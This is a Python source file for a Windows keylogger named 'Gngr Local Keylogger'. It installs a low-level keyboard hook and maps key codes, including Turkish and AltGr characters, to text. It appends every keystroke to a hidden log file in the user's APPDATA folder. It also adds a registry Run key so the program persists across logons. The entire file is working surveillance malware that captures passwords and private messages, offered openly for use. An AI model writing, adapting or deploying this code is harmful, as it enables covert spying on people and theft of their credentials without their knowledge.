############################################################################
#   
#   keyboard_log.py (Gngr Local Keylogger)
#   © 2021 ABDULKADİR GÜNGÖR All Rights Reserved
#   Contact email address: abdulkadir_gungor@outlook.com
#
#	Developper:	Abdulkadir GÜNGÖR (abdulkadir_gungor@outlook.com)
#	Date:	04/2021
#	All Rights Reserved (Tüm Hakları Saklıdır)
#
############################################################################
from collections import namedtuple
import os, time, winreg

Handlers = []
KeyboardEvent = namedtuple('KeyboardEvent', ['Event_Type', 'Key_Code',
                                             'Scan_Code', 'Alt_Press',
                                             'Time'])
global LOGFILE,LOWER_KEY, ALTGR_KEY, WAIT_KEY

def start_program():
    # Create directory
    try:
        directory_check = "{}\\Gngr-keylogger-v1.0\\".format(os.getenv('APPDATA'))
        res = os.path.isdir(directory_check)
        if not res:
            os.mkdir(directory_check)
    except:
        exit(0)

    # Persistence
    try:
        reg_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
        reg_name = 'Gngr_keyboard_log'
        reg_value = "{}\\Gngr-keylogger-v1.0\\keyboard_log.exe".format(os.getenv('APPDATA'))
        #
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, reg_name, 0, winreg.REG_SZ, reg_value)
        winreg.CloseKey(registry_key)
    except:
        pass

def keyboard_listen():
    from ctypes import windll, CFUNCTYPE, POINTER, c_int, c_void_p, byref
    import win32con, win32api, win32gui, atexit
    #
    event_types = {win32con.WM_KEYDOWN: 'Key Down',
                   win32con.WM_KEYUP: 'Key Up',
                   0x104: 'Alt Key Down',
                   0x105: 'Alt Key Up',
                   }

    #

    def low_handler(nCode, wParam, lParam):
        event = KeyboardEvent(event_types[wParam], lParam[0], lParam[1],
                              lParam[2] == 32, lParam[3])
        for handler in Handlers:
            handler(event)
        #
        return windll.user32.CallNextHookEx(hook_id, nCode, wParam, lParam)

    #
    CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
    pointer = CMPFUNC(low_handler)
    #
    hook_id = windll.user32.SetWindowsHookExA(win32con.WH_KEYBOARD_LL, pointer,
                                              win32api.GetModuleHandle(None), 0)
    #
    atexit.register(windll.user32.UnhookWindowsHookEx, hook_id)
    #
    while True:
        msg = win32gui.GetMessage(None, 0, 0)
        win32gui.TranslateMessage(byref(msg))
        win32gui.DispatchMessage(byref(msg))
    #


if __name__ == '__main__':
    #
    global LOGFILE, LOWER_KEY, ALTGR_KEY, WAIT_KEY
    LOWER_KEY = True
    WAIT_KEY = False
    ALTGR_KEY = False
    LOGFILE = ''


    #
    def key_function(key):
        global LOGFILE

        if LOGFILE != None and LOGFILE != '':
            with open(LOGFILE, "a+") as file:
                file.write(key)
        else:
            timestr = time.strftime("%Y-%m-%d__%H-%M-%S")
            LOGFILE = "{}\\gngr-keylogger-v1.0\\{}__Keyboard_Logs.txt".format(os.getenv('APPDATA'), timestr)
            with open(LOGFILE, "a+") as file:
                file.write(key)

    # "https://docs.microsoft.com/tr-tr/dotnet/api/system.windows.forms.keys?view=net-5.0" harfler bu tabloya gore tanimlanabilir.
    def keyboard_event(key):
        global LOGFILE, LOWER_KEY, ALTGR_KEY, WAIT_KEY
        r_key = ''

        # --- "Key Down" ---
        if key.Event_Type == "Key Down":
            if key.Key_Code == 8:
                r_key = '<{DEL}>'
            elif key.Key_Code == 9:
                r_key = '\t'
            elif key.Key_Code == 13:
                r_key = '<{ENTER}>\n'
            elif key.Key_Code == 27:
                r_key = '<{ESC}>'
            elif key.Key_Code == 20:
                LOWER_KEY = not LOWER_KEY
            elif key.Key_Code == 32:
                r_key = ' '
            elif 65 <= key.Key_Code <= 90:
                r_key = str(chr(key.Key_Code))
                if LOWER_KEY:
                    if key.Key_Code == 73:
                        r_key = "ı"
                    else:
                        r_key = r_key.lower()
            elif key.Key_Code == 160 or key.Key_Code == 161:
                WAIT_KEY = True
            elif key.Key_Code == 144:
                r_key = '<{NUM_LOCK}>'
            elif key.Key_Code == 186:
                r_key = 'Ş'
                if LOWER_KEY:
                    r_key = 'ş'
            elif key.Key_Code == 191:
                r_key = 'Ö'
                if LOWER_KEY:
                    r_key = 'ö'
            elif key.Key_Code == 219:
                r_key = 'Ğ'
                if LOWER_KEY:
                    r_key = 'ğ'
            elif key.Key_Code == 220:
                r_key = 'Ç'
                if LOWER_KEY:
                    r_key = 'ç'
            elif key.Key_Code == 221:
                r_key = 'Ü'
                if LOWER_KEY:
                    r_key = 'ü'
            elif key.Key_Code == 222:
                r_key = 'İ'
                if LOWER_KEY:
                    r_key = 'i'
            elif 96 <= key.Key_Code <= 105:
                if key.Key_Code == 96:
                    r_key = '0'
                elif key.Key_Code == 97:
                    r_key = '1'
                elif key.Key_Code == 98:
                    r_key = '2'
                elif key.Key_Code == 99:
                    r_key = '3'
                elif key.Key_Code == 100:
                    r_key = '4'
                elif key.Key_Code == 101:
                    r_key = '5'
                elif key.Key_Code == 102:
                    r_key = '6'
                elif key.Key_Code == 103:
                    r_key = '7'
                elif key.Key_Code == 104:
                    r_key = '8'
                elif key.Key_Code == 105:
                    r_key = '9'
            elif key.Key_Code == 189:
                if WAIT_KEY:
                    r_key = "_"
                else:
                    r_key = "-"
            elif key.Key_Code == 223:
                if WAIT_KEY:
                    r_key = "*"
                else:
                    r_key = "?"
            elif 48 <= key.Key_Code <= 57:
                if WAIT_KEY:
                    if key.Key_Code == 48:
                        r_key = '='
                    elif key.Key_Code == 49:
                        r_key = '!'
                    elif key.Key_Code == 50:
                        r_key = "'"
                    elif key.Key_Code == 51:
                        r_key = '^'
                    elif key.Key_Code == 52:
                        r_key = '+'
                    elif key.Key_Code == 53:
                        r_key = '%'
                    elif key.Key_Code == 54:
                        r_key = '&'
                    elif key.Key_Code == 55:
                        r_key = '/'
                    elif key.Key_Code == 56:
                        r_key = '('
                    elif key.Key_Code == 57:
                        r_key = ')'
                else:
                    if key.Key_Code == 48:
                        r_key = '0'
                    elif key.Key_Code == 49:
                        r_key = '1'
                    elif key.Key_Code == 50:
                        r_key = '2'
                    elif key.Key_Code == 51:
                        r_key = '3'
                    elif key.Key_Code == 52:
                        r_key = '4'
                    elif key.Key_Code == 53:
                        r_key = '5'
                    elif key.Key_Code == 54:
                        r_key = '6'
                    elif key.Key_Code == 55:
                        r_key = '7'
                    elif key.Key_Code == 56:
                        r_key = '8'
                    elif key.Key_Code == 57:
                        r_key = '9'
            elif key.Key_Code == 188:
                if WAIT_KEY:
                    r_key = ";"
                else:
                    r_key = ","
            elif key.Key_Code == 190:
                if WAIT_KEY:
                    r_key = ":"
                else:
                    r_key = "."
            elif key.Key_Code == 226:
                if WAIT_KEY:
                    r_key = ">"
                else:
                    r_key = "<"
            elif key.Key_Code == 106:
                r_key = "*"
            elif key.Key_Code == 107:
                r_key = "+"
            elif key.Key_Code == 109:
                r_key = "-"
            elif key.Key_Code == 111:
                r_key = "/"
            elif key.Key_Code == 110:
                r_key = ","
            elif key.Key_Code == 46:
                r_key = "<NUM_LOCK DEL>"
            elif key.Key_Code == 37:
                r_key = "<{LEFT}>"
            elif key.Key_Code == 38:
                r_key = "<{UP}>"
            elif key.Key_Code == 39:
                r_key = "<{RIGHT}>"
            elif key.Key_Code == 40:
                r_key = "<{LEFT}>"

            #
            if r_key != '':
                key_function(r_key)
            else:
                if (key.Key_Code != 20) and (key.Key_Code != 160) and (key.Key_Code != 161):
                    r_key = "<{KEY_CODE:" + str(key.Key_Code) + "}>"
                    key_function(r_key)

        # --- "Key Up" ---
        if key.Event_Type == "Key Up":
            if key.Key_Code == 160 or key.Key_Code == 161:
                WAIT_KEY = False
            if key.Key_Code == 162 or key.Key_Code == 165:
                ALTGR_KEY = False

        # --- "Alt Key Down" ---
        if key.Event_Type == "Alt Key Down":
            #
            if key.Key_Code == 20:
                LOWER_KEY = not LOWER_KEY
            elif key.Key_Code == 160 or key.Key_Code == 161:
                WAIT_KEY = True
            elif key.Key_Code == 162 or key.Key_Code == 165:
                if not ALTGR_KEY:
                    r_key = "<{ALT_GR}>"
                else:
                    r_key = ''
                ALTGR_KEY = True
            else:
                if key.Key_Code == 164:
                    r_key = "<{ALT}>"
                else:
                    if ALTGR_KEY:
                        if key.Key_Code == 81:
                            r_key = '@'
                        elif key.Key_Code == 221:
                            r_key = "~"
                        elif key.Key_Code == 226:
                            r_key = "|"
                        elif key.Key_Code == 188:
                            r_key = "`"
                        elif key.Key_Code == 186:
                            r_key = "´"
                        elif key.Key_Code == 189:
                            r_key = "|"
                        elif key.Key_Code == 223:
                            r_key = "\\"
                        elif key.Key_Code == 48:
                            r_key = "}"
                        elif key.Key_Code == 49:
                            r_key = ">"
                        elif key.Key_Code == 50:
                            r_key = "£"
                        elif key.Key_Code == 51:
                            r_key = "#"
                        elif key.Key_Code == 52:
                            r_key = "$"
                        elif key.Key_Code == 53:
                            r_key = "½"
                        elif key.Key_Code == 55:
                            r_key = "{"
                        elif key.Key_Code == 56:
                            r_key = "["
                        elif key.Key_Code == 57:
                            r_key = "]"
                        elif key.Key_Code == 37:
                            r_key = "<{LEFT}>"
                        elif key.Key_Code == 38:
                            r_key = "<{UP}>"
                        elif key.Key_Code == 39:
                            r_key = "<{RIGHT}>"
                        elif key.Key_Code == 40:
                            r_key = "<{DOWN}>"
                        else:
                            r_key = "<{ALT_GR+KEY_CODE:" + str(key.Key_Code) + "}>"
                    else:
                        if key.Key_Code == 37:
                            r_key = "<{LEFT}>"
                        elif key.Key_Code == 38:
                            r_key = "<{UP}>"
                        elif key.Key_Code == 39:
                            r_key = "<{RIGHT}>"
                        elif key.Key_Code == 40:
                            r_key = "<{DOWN}>"
                        else:
                            r_key = "<{ALT+KEY_CODE:" + str(key.Key_Code) + "}>"
            #
            if r_key != "":
                key_function(r_key)

        # --- "Alt Key Up" ---
        if key.Event_Type == "Alt Key Up":
            if key.Key_Code == 160 or key.Key_Code == 161:
                WAIT_KEY = False
            if key.Key_Code == 162 or key.Key_Code == 165:
                ALTGR_KEY = False

    start_program()
    Handlers.append(keyboard_event)
    keyboard_listen()


